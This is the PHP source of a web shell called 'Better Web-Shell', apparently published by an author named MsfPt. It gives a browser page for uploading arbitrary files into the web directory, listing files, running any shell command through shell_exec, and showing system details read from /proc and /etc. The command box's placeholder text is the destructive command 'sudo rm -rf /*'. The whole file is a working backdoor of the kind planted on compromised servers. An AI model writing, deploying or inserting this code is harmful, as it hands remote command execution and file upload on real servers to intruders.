<?php

    session_start();
    
    function getKey() {
        return str_rot13(md5(uniqid((rand()+rand()), TRUE)));
    }

    $_SESSION['tmpKey'] = getKey();

?>
<!DOCTYPE html>
<!--
  - ReCode & Debug By MsfPt
  - https://github.com/msfpt
-->
<html>
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>Better Web-Shell</title>
        <meta name="title" content="MsfPt :: Better Web-Shell">
        <meta name="theme-color" content="dark">
        <meta name="description" content="Upload pannel and system commands webshell coded with php">
        <meta name="keywords" content="msfpt, books, education, programming, python, developer, django, programmer, rust, ruby, shell, perl, php, linux, window, tools, kernel, javascript, typescript, js, ts, kotlin, java, react, angular, react native, b4a, p4a, kivy, qt, pyside, c, cpp, c++, sh">
        <meta name="robots" content="index, follow">
        <meta name="revisit-after" content="1 days">
        <meta name="language" content="English">
        <meta name="author" content="MsfPt">
        <meta name="MobileOptimized" content="176">
        <meta name="HandheldFriendly" content="True">
        <meta property="og:title" content="MsfPt :: Better Web-Shell" />
        <meta property="og:site_name" content="Better Web-Shell">
        <meta property="og:description" content="Upload pannel and system commands webshell coded with php" />
        <meta property="og:locale" content="en_US">
        <meta name="viewport" content="width=device-width, initial-scale=0.85, maximum-scale=0.85, user-scalable=no">
        <link rel="shortcut icon" type="image/x-icon" href="https://msfpt.github.io/favicon.ico" >
        <link rel="apple-touch-icon" href="https://msfpt.github.io/assets/icons/apple-touch-icon.png"/>
        <link rel="alternate icon" href="https://msfpt.github.io/favicon.ico" type="image/x-icon"/>
        <link rel="stylesheet" href="style.css">
    </head>
    <body>

        <?php

            function alert($text = '') {
                echo "<script type='text/JavaScript'>

const alertBox = document.createElement('section');
alertBox.classList.add('alert-box');
alertBox.innerHTML = `<div class='alert'><div close onclick='event.srcElement.parentNode.parentNode.remove();'>×</div><p>$text</p></div>`;
document.body.appendChild(alertBox)
</script>";
            }

            function setKey() {
                echo '<input type="hidden" name="key" value="'.$_SESSION['tmpKey'].'">';
            }

        ?>

        <div class="card" id="container">
            <form action="" method="POST" enctype="multipart/form-data">
                <label for="uf" class="btn">
                    <span>Select File</span>
                    <input type="file" name="file" class="upload-input" id="uf">
                </label>
                <?php setKey(); ?>
                <input type="submit" value="Upload" class="btn" id="ufs">
            </form>

                <p id="uft" hidden></p>

            <?php
                if(isset($_FILES['file'])){
                    if ($_POST['key']===$_SESSION['key']) {
                        $file_name = $_FILES['file']['name'];
                        $file_tmp =$_FILES['file']['tmp_name'];
                        move_uploaded_file($file_tmp, $file_name);
                        alert("File has been uploaded successfuly!");
                        http_response_code(200);
                    } else {
                        alert("There was a problem authentication.");
                        http_response_code(401);
                    }
                }
            ?>

            <ul class="incard">
                <?php
                    $dir_handle = scandir('.');
                    foreach ($dir_handle as $key => $file_name) {
                        if ($file_name == '.' || $file_name == '..') {
                            continue;
                        }
                        echo("<li>$file_name</li>");
                    }
                ?>
            </ul>

            <form action="" method="POST">
                <input name="sh" type="text" placeholder=" ~$ sudo rm -rf /*" spellcheck="false" class="command-input" id="cmd">
                <?php setKey(); ?>
                <input class="btn" type="submit" value="Run" id="cmds">
            </form>
        </div> 

        <?php
            if(isset($_POST['sh']) && !empty($_POST['sh'])) {
                if ($_POST['key']===$_SESSION['key']) {
                    $sh_res = shell_exec($_POST['sh']);
                    echo "<section id='console'><pre spellcheck='false' readonly='readonly' unselectable='on'>$sh_res</pre><div close onclick='event.srcElement.parentNode.remove();'>×</div></section>";
                    http_response_code(200);
                } else {
                    alert("There was a problem authentication.");
                    http_response_code(401);
                }
            }
        ?>

        <div class="card" id="info">
            <?php

            function getBrowser() { // get Browser name
                // source : https://github.com/msfpt/Snow
                $user_agent = $_SERVER['HTTP_USER_AGENT'];
                $browser        = "Unknown";
                $browser_array  = array(
                    '/msie/i'       =>  'Internet Explorer',
                    '/firefox/i'    =>  'Firefox',
                    '/safari/i'     =>  'Safari',
                    '/chrome/i'     =>  'Chrome',
                    '/edge/i'       =>  'Edge',
                    '/opera/i'      =>  'Opera',
                    '/netscape/i'   =>  'Netscape',
                    '/maxthon/i'    =>  'Maxthon',
                    '/konqueror/i'  =>  'Konqueror',
                    '/mobile/i'     =>  'WebView'
                );
           
                foreach ( $browser_array as $regex => $value ) { 
                    if ( preg_match( $regex, $user_agent ) ) {
                        $browser = $value;
                    }
                }
                return $browser;
            }

            /* Browser */
            $browser = getBrowser();

            /* CPU */
            $cpu_file = fopen("/proc/cpuinfo", "r");
            error_reporting (E_ALL ^ E_NOTICE);
            while(($line = fgetcsv($cpu_file, 0, ":")) !== FALSE) {
                $lines_array_cpu[] = $line[1];
            }
            fclose($cpu_file);
            $cpu = $lines_array_cpu[4];

            /* Distro */
            $distro_file = fopen("/etc/os-release", "r");
            while(($line = fgetcsv($distro_file, 0, "=")) !== FALSE) {
                $lines_array_distro[] = $line[1];
            }
            fclose($distro_file);
            $distro = $lines_array_distro[2];

            /* Editor */
            $editor = getenv("EDITOR");

            /* Hostname */
            $hostname = file_get_contents("/etc/hostname");

            /* Kernel */
            $kernel = file_get_contents("/proc/sys/kernel/osrelease");

            /* Music */
            $music = shell_exec("rsmpc current");

            /* Package count */
            $pkg_list = array_filter(glob("/var/db/pkg/*/*/"), "is_dir");
            $pkgs = count($pkg_list, 0);

            /* Shell */
            $shell = getenv("SHELL");

            /* Uptime */
            $uptime_pre = file_get_contents("/proc/uptime");
            $uptime_array = explode(".", $uptime_pre);
            $uptime = $uptime_array[0];

            if ($uptime > 86400) {
                $days_pre = $uptime / 60 / 60 / 24;
                $days_pre = explode(".", $days_pre);
                $days = ($days_pre[0] . "d");
            } else {
                $days = "";
            }

            if ($uptime > 3600) {
                $hours_pre = ($uptime / 60 / 60) % 24;
                $hours = ($hours_pre . "h");
            } else {
                $hours = "";
            }

            if ($uptime > 60) {
                $minutes_pre = ($uptime / 60) % 60;
                $minutes = ($minutes_pre . "m");
            } else {
                $minutes = "less than one minute";
            }

            $uptime_message = ($days . " " . $hours . " " . $minutes);

            /* User */
            $user = getenv("USER");

            /* Asseble output into an array*/
            $output = array(
                array("title"=>"Browser", "Info"=>"$browser"),
                array("title"=>"CPU", "Info"=>"$cpu"),
                array("title"=>"Distro", "Info"=>"$distro"),
                array("title"=>"Editor", "Info"=>"$editor"),
                array("title"=>"Hostname", "Info"=>"myPc"), // $hostname
                array("title"=>"Kernel", "Info"=>"$kernel"),
                array("title"=>"Packages (Portage)", "Info"=>"$pkgs"),
                array("title"=>"Shell", "Info"=>"$shell"),
                array("title"=>"Uptime", "Info"=>"$uptime_message"),
                array("title"=>"User", "Info"=>"msfpt"), // $user
                array("title"=>"Music", "Info"=>"$music")
            );

            foreach ($output as $row){
                if (strlen($row['Info']) < 1) { continue; }
                echo "<p class=\"info-item\">$row[title] : $row[Info]</p>";
            } 

            ?>
        </div>
        <script type="text/JavaScript">
const inputFile = document.querySelector('#uf');
const inputFileText = document.querySelector('#uft');
const inputFileSubmit = document.querySelector('#ufs');
const inputCmd = document.querySelector('#cmd');
const inputCmdSubmit = document.querySelector('#cmds');

const alertShow = text => {
    const alertBox = document.createElement('section');
    alertBox.classList.add('alert-box');
    alertBox.innerHTML = `<div class='alert'><div close onclick='event.srcElement.parentNode.parentNode.remove();'>×</div><p>` + text + `</p></div>`;
    document.body.appendChild(alertBox)
}

inputFile.addEventListener('change', event => {
    if (inputFile.files.length !== 0) {
        inputFileText.hidden = false;
        inputFileText.innerText = inputFile.files[0].name;
    }
});

inputFileSubmit.addEventListener('click', event => {
    if (inputFile.files.length == 0) {
        alertShow("First select a file !")
        event.preventDefault();
    } else {
        inputFileText.innerText = '';
        inputFileText.hidden = true;
    }
});

inputCmdSubmit.addEventListener('click', event => {
    if (inputCmd.value.trim() == '') {
        alertShow("First Write Command !")
        event.preventDefault();
    }
});

</script>
        <script type="text/JavaScript" async="true" src="https://msfpt.github.io/GitHubStar/github-star.js" status="GitHubStar" repository="Better-WebShell" user="FireKing255"></script>
        <?php $_SESSION['key'] = $_SESSION['tmpKey']; ?>
    </body>
</html>
